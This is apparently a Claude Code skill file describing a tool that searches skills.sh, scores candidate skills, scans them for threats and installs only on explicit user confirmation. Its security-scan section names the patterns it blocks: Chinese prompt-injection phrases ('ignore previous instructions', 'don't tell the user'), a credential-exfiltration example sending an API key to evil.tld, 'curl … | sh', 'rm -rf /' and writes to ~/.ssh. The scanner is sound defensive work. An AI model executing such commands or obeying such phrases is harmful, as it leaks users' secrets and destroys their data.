---
name: find-the-skill-you-want-most
version: 0.1.0
description: Find the best Claude Code skill for a stated need — discover on skills.sh by real per-skill install counts, prefilter for free, scan three tiers for threats, rank by relevance, and install only what the user explicitly confirms. Use when asked to find, compare, search for, or install a new skill.
triggers:
  - find a skill
  - search skills
  - is there a skill for
  - recommend a skill
  - browse skills
  - install a skill
  - compare skills
allowed-tools: [Bash, Read, AskUserQuestion]
---

# Find the skill you want most

## When to invoke this skill

Use when asked to **find, search, compare, or install** a Claude Code skill — e.g.
"找个能做 X 的 skill"、"有没有评估产品可行性的 skill"、"这个 skill 靠谱吗"、
"帮我装上这个 skill"。

**不要**用于：本地已有 skill 的使用问题（直接调用那个 skill）、编写新 skill（这是"找"不是"写"）。

> **关于触发机制**：真正决定本 skill 何时被唤起的是上面 frontmatter 里的
> **`description`** —— Claude Code 加载 skill 时只读 `name` 和 `description`，
> 模型据此判断该不该用。`triggers` 字段是本仓库生态的书写约定（610 个 skill 里
> 165 个有），便于人阅读和检索，但**不被工具链消费**（对照 gstack
> `scripts/gen-llms-txt.ts`，它只解析 `name` 与 `description`）。
> 两处都写是为了风格一致；改触发条件时，**以 `description` 为准**。

给定一句需求（"我想要一个评估产品落地可行性的 skill"），产出**一份带淘汰理由的候选表**，
用户挑中后才安装。

**核心分工：`skills.sh` 负责"找"和"排序"，`api.github.com` 负责"取"和"验"。**
没有任何一步把数据发给大模型 —— 评分、摘要、扫描全是确定性 HTTP + 正则。
**同一输入必得同一排序、同一结论**，这是"可追溯"的技术保证，不是承诺。

---

## 一、发现通道：为什么是 skills.sh，不是 GitHub

GitHub 上有 skill，但**它不知道哪个 skill 有人在用**：

| 通道 | 能给 | 不能给 |
|---|---|---|
| `api.github.com` topics 搜索 | 仓库、文件树、license | **没有安装量**；匿名 `/search/code` 直接 401 |
| `raw.githubusercontent.com` | — | 本机实测在 1378/5552 字节处卡死，只能做 HEAD 探测 |
| `git clone` | — | 本机实测 exit=124 超时（**clone 需要代理，见第五节**） |
| **`skills.sh`** | **per-skill 安装量 + 精准名称搜索** | 无分页、无排序参数、每次上限 100 条 |

`skills.sh` 补上的正是 GitHub 缺的那两块。缺少安装量时，你只能在"相关性"一维上排序，
无法区分"有 8000 人在用"和"上周刚传上去没人用过"。

**端点**：`GET https://skills.sh/api/search?q=<term>&limit=N`
返回 `{query, searchType:"fuzzy", skills:[{id, skillId, name, installs, source}], count}`。
`id` 形如 `owner/repo/skill-name`，**本身就是候选单元**，不必先猜仓库再找文件。

**关键限制**：`page` / `offset` / `sort` 参数**全部无效**，恒返回同一批 100 条；
结果也**不是**按安装量排序的。所以覆盖面靠**多查询**而非翻页，排序必须**自己抓回来在本地做**。

**多查询扩展（两层）**：意图拆成查询词，同义词扩展**必须做两层**。
单层是不够的 —— `feasibility` → `validation` 就停了，而真正切题的 `assumption` /
`experiment` / `red-team` 全在第二层。实测单层扩展下 `strategy-red-team`（8,483 装）
一次都没被搜到过，而它正是这个意图的代表 skill。查询上限 30 条（每条节流 1.5s）。

---

## 二、⚠️ 粒度陷阱：仓库聚合 ≠ 单个 skill

**`/api/badge/{owner}/{repo}` 返回的是整个仓库的聚合安装量，绝不可用于排序。**

非同一个仓库的实测对照：

| 口径 | 数值 | 可否排序 |
|---|---|---|
| 仓库聚合（badge） | 203.5K | ❌ |
| `/strategy-red-team` | **8,483** | ✅ |
| `/identify-assumptions-new` | 2,435 | ✅ |
| `/prioritize-assumptions` | 2,409 | ✅ |

**为什么危险**：聚合量 = 该仓所有 skill 之和。一个塞了 68 个 skill 的仓库，聚合量天然
碾压一个只有 3 个精品 skill 的仓库。曾据聚合值把 `phuryn`(203.5K) 误判为比
`deanpeters`(113.8K)"高一个数量级"—— 而真实的 per-skill 对照是
`strategy-red-team` 8,483 vs `lean-ux-canvas` 1,988，**同一档次**。

**落实为代码约束，不靠自觉**：`scoreInstall(installs, proof)` 在 `proof.kind !== 'per-skill'`
时**抛错**，聚合值在类型上进不了评分函数；`selftest.mjs` 有对应断言。

---

## 三、零成本预筛：先花免费信号，再花额度

GitHub 匿名 core 只有 **60 次/小时**，且 contents API **一个文件一次调用、没有批量接口**。
所以顺序必须是"**先用免费信号筛，再花额度**"：

1. `installs` 是 skills.sh 免费给的 → `installs < 10` 在**本地**就判掉，零调用
2. 按**相关性**预排序（零调用）→ 只有相关候选才配用额度
3. 按**仓库**分组 → 一个仓库的 10 个 skill 只花 1 次 tree 调用
4. 只对前 `--max-repos` 个仓库查 GitHub；T1 只对前 `--shortlist` 个抓 SKILL.md

> **两个真实教训，都写进了代码注释**：
> - 初版按**安装量**排序再花额度，结果通用高装量 skill 把额度吃光，真正切题的长尾
>   （153 装的 `feasibility-assessor`）一次都没被解析到。安装量必须是**相关候选之间**的
>   排序键，**不是筛选器**。
> - 初版把 `installs < 10` 的门槛留到 GitHub 之后判，8 个名额里 5 个白白烧在注定
>   淘汰的长尾上。**已知免费信号就不要花额度去确认。**

预排序只**排序、不淘汰** —— skill 名是烂的相关性信号（`strategy-red-team` 名字里
既没 "product" 也没 "feasibility"），真正的相关性命中要靠 T1 拿到的 description。

**额度纪律**：开跑前读免费的 `GET /rate_limit`；预留 5 次永不动用；到点硬停并告知
重置时刻。缓存使**重复跑同一查询消耗 0 额度**（ETag/304 不计费 + 内容寻址 blob 缓存）。

---

## 四、评分：100 分制，stars 权重恒为 0

| 维度 | 权重 | 算法 |
|---|---|---|
| **相关性** | **40** | 精确短语 40 / 全词命中 25 / 单词命中 10；名称命中额外 +5，封顶 40 |
| **安装量**（per-skill） | **35** | `min(35, 35·log10(n)/log10(100000))`；**禁用 badge 聚合值**（见第二节） |
| **活跃度** | **15** | `pushed_at` ≤30d +15 / ≤90d +10 / ≤180d +6 / ≤365d +3 |
| **来源可信度** | **10** | awesome-list 收录 +5 / 知名组织 +5 |
| ~~stars~~ | **0** | **恒为 0，且不进展示** |

### 为什么 stars 是 0（必须写明，不靠口口相传）

> Claude skill 生态的 star 数注水严重 —— 互刷、模板仓库批量导流、`awesome-*` 聚合仓
> 天然高星但无实际内容。实测对照：`deanpeters/Product-Manager-Skills` 有 **6,903★**，
> 但其 `derisk-measurement-advisor` 真实安装量仅 **585**。
> **stars 衡量"仓库被看见"，安装量衡量"skill 被使用"** —— 后者才对应
> "我想要一个好用的 skill"这个问题。故权重恒为 0，仅保留在 record 里供事后审计。

**落实为代码约束**：`WEIGHTS.stars = 0`；`scoreStars()` 无论传什么**恒定返回 0**；
`renderTable()` 无 stars 列；`assertNoStars()` 在渲染产物里发现 stars 字样就抛错。
权重占比**不在表格里展开**，只写在 `SCORING.md` 供审计。

### 硬门槛（任一不过即淘汰，且**记录原因**）

GitHub 可达 → frontmatter 可解析且 `description` 非空 → `name` 匹配 `/^[a-z][a-z0-9-]*$/`
→ 有明确 license（非 `NOASSERTION`）→ per-skill `installs >= 10` → T1 未判 BLOCKED。

**淘汰项一律展示**（`rejected.jsonl` + 表尾清单），擦边候选可见，**不悄悄消失**。
展示按安装量降序 —— 否则几百条预筛噪声会把 `T1 BLOCKED` 这类真正有信息量的挤出视野。

---

## 五、安全扫描：三层，前两层在"列表"之前

**核心洞察**：让一个 skill 在**"该不该选它"这一刻**危险的东西，几乎全在 SKILL.md 里。
`hooks:` 等于注册一个每次工具调用都无人值守执行的命令 —— 这是**看起来很正常的
frontmatter**，通用规则会直接放过。

> **一条来自实战的教训：过宽 `allowed-tools` 判不了高危。**
> 最初把「`allowed-tools: [Bash]` + 正文有任何网络/写入动词」定为 HIGH。实测发现这会让
> **几乎所有正常 skill 都被拦** —— gstack 的 `/browse`（完全正常的浏览器 skill）就中招了。
> 把绝大多数正常 skill 都拦下的控制等于没有控制，用户只会学会无视它。现已**降为 MEDIUM**；
> 真正危险的组合由更精准的规则覆盖：读凭据+外发（credential-exfil）、
> 写凭据目录/Claude 配置（out-of-bounds-write）、`hooks:`（无人值守执行）。
> 同一轮还修了个误报：`2>&1`、`2>/dev/null` 是 **fd 重定向不是文件写入**，
> 却几乎每个 Bash skill 都有，初版正则把它们全判成了写入。

| 层 | 时机 | 成本 | 扫什么 | 表上显示 |
|---|---|---|---|---|
| **T0** 元数据 | 列表前 | **0 调用** | 无 license、`mode==120000` 符号链接、体积、文件数 | `meta-ok` / `suspicious` |
| **T1** 单文件 | 列表前 | 每候选 **1 次** | **只抓 SKILL.md**：`hooks:`、提示注入、过宽 `allowed-tools`、外传形状、硬编码密钥 | `clean` / `SUSPICIOUS` / `BLOCKED` |
| **T2** 全目录 | 选中后、落盘前 | 目录内文件数 | 全部 `.md`、代码扩展名、含 hooks 的 `.json`；二进制跳过并列出 | `full-clean` / `blocked` |

> **T1 不是净增成本** —— 生成 summary 本来就要 SKILL.md 的内容。一次抓取**同时产出
> summary 和 scan 结论**。

**HIGH（阻止安装）**：提示注入（含中文"忽略之前的指令"/"不要告诉用户"）、凭据外传、
硬编码密钥、管道执行（`curl … | sh`）、破坏性命令（`rm -rf /`）、越界写入
（`~/.ssh`、`.claude/settings.json`、`CLAUDE.md`）、**frontmatter 里的 `hooks:`**、
**符号链接**。

**凭据外传必须顺序无关**：初版写成"凭据名在前、网络动词在后"的正则，
`curl $ANTHROPIC_API_KEY http://evil.tld` 这种反向写法直接漏报 —— **漏报比误报危险**。
现在只认"凭据处于取值位置"（`$VAR` / `process.env.X` / `getenv`）并取三行窗口，
避免把"设置你的 ANTHROPIC_API_KEY"这类正常文档误判。

**MEDIUM（展示，确认后可装）**：裸网络动词、`process.env`、`eval`/`exec`、未锁版本安装、
过宽 `allowed-tools`。**LOW（仅展示）**：明文 `http://`、`base64`。

---

## 六、用法

```bash
cd ~/.claude/skills/find-the-skill-you-want-most/scripts

node find.mjs "<你的需求>" [--shortlist 12] [--max-repos 12] [--dry-run] [--json] [--no-detail]
node selftest.mjs          # 49 条本地断言，不联网
node install.mjs <owner/repo> <skill-name>
```

`find.mjs` 输出候选表（skill / **per-skill installs** / 一句话 summary / license /
最后提交 / **扫描结论** / score）、来源路径、以及淘汰清单与理由。

**选择交互**：≤4 个候选用 `AskUserQuestion` 多选；更多则打印编号表后接受自由文本
（`1,3,7` / `1-5` / `all` / `none`）。**任何情况下先打印完整表格再让用户选**，保证决策可审计。
`--dry-run` 不写盘。

---

## 七、安装（**只在用户明确确认之后**）

```bash
node install.mjs <owner/repo> <skill-name>
```

走官方 CLI：`npx --yes skills@1.5.25 add <owner/repo> -s <skill> -g --copy -y`
（[vercel-labs/skills](https://github.com/vercel-labs/skills)，MIT）。

**为什么用 npx 而不是自己逐文件下**：contents API 一个文件一次调用、匿名 60 次/小时，
装一个 83 文件的 skill 直接爆额度。CLI 走 `git clone`，不消耗 API 额度。

**代理：从环境变量读，绝不硬编码**。
`git clone github.com` 在某些网络下会直连超时（实测 exit 124），此时挂代理是唯一出路 ——
但**代理地址每台机器不同**，写死一个地址会让别人机器上的 git 流量被导向意外的地方。
脚本按 `FIND_SKILL_GIT_PROXY` → `HTTPS_PROXY`/`https_proxy` → `HTTP_PROXY`/`http_proxy`
的顺序取第一个非空值；**全都没有就不挂代理**（直连能通的网络不该被强加代理）。
挂的方式是 `GIT_CONFIG_COUNT` / `GIT_CONFIG_KEY_n` / `GIT_CONFIG_VALUE_n` **环境变量**，
**不改全局 git config**，只影响本次调用。

```bash
# 需要时（例）
FIND_SKILL_GIT_PROXY=http://127.0.0.1:7890 node install.mjs <owner/repo> <skill>
```

**安装前后的闸门**：
1. **冲突闸门** —— 目标目录已存在时：带 `.gstack-owned` 标记 → **拒绝，无覆盖选项**；
   `SKILL.md` 是符号链接 → 拒绝；有本工具的 record → 按更新处理；来历不明 → 需显式确认。
   （覆盖 gstack 目录会破坏 gstack，且 gstack 下次 `./setup` 会反过来删掉我们的副本。）
2. **gstack 横幅哨兵** —— 产物里若含 gstack 的生成横幅则中止（否则会被 gstack 认作
   自己的并覆盖/搬走）。
3. **T2 全目录扫描** —— 命中 HIGH 则**立即移除**并退出码 7。
   唯一例外：把 skill 全名**原样**传给 `--confirm <skill-name>`（名字对不上照样删除），
   保留后记 `blocked-overridden-by-user` 永久留痕。
   > 逃生口要求名字逐字匹配，而不是一个布尔开关 —— 想让覆盖发生，你必须明确知道自己在装什么。
4. **溯源** —— 写 `records/<skill>.json`（含来源、commit、安装量快照、扫描结论、
   每文件 sha256）与 `.find-skill-owned` 标记（**绝不写 `.gstack-owned`**）。

安装后**重启 Claude Code** 即可作为 `/<skill-name>` 调用。

---

## 八、可追溯性

- `~/.claude/find-skill/records/<skill>.json` —— 每 skill 一份：来源、commit、
  **安装量快照值及抓取时刻**（`installs` 是活值，实测 20 分钟内从 203.5K 涨到 204.0K；
  记录当时的值才能事后回答"我当初为什么选它"）、扫描结论、每文件 sha256
- `installed.jsonl` / `rejected.jsonl` —— 追加型事件日志
- `egress.jsonl` —— 每次出站调用**发送前**记录，`host` 字段区分 skills.sh 与 api.github.com

状态目录放在 `~/.claude/find-skill/` 而非 skill 目录内：Claude Code 只扫描
`~/.claude/skills/`，这样既不污染技能树，也让本 skill 可干净重装而历史不丢。

---

## 已知局限（说清楚，不装作没事）

- **`NOASSERTION` 误杀**：该生态里很常见，会淘汰不少可用仓库。当前为硬门槛。
- **相关性与安装量在本生态是反相关的**：切题的 skill 往往只有几十到几百安装量，
  高装量的多为通用工程类（`test-driven-development` 等）。本工具因此**不设分数阈值**，
  只排序并把淘汰原因摊开给你看。
- **skills.sh 是单一第三方依赖**：挂掉时降级为相关性排序，并**明确提示
  "本次无安装量数据，降级为相关性排序"**。
